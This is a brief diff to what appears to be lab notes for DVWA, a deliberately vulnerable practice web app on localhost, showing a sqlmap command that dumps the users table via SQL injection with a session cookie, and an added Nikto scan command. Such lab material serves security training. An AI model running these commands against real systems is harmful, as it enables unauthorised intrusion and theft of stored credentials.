@@ -36,3 +36,7 @@ sqlmap -u "http://127.0.0.1/DVWA/vulnerabilities/sqli/?id=1&Submit=Submit" \
 
 sqlmap -u "http://127.0.0.1/DVWA/vulnerabilities/sqli/?id=1&Submit=Submit" \
 --cookie="security=low; PHPSESSID=62872aa381f5f24da77630834bef64d1" -D dvwa -T users --dump
+
+🔸 Nikto Scan
+nikto -h http://127.0.0.1 -o dvwa-nikto-report.html -Format html
+
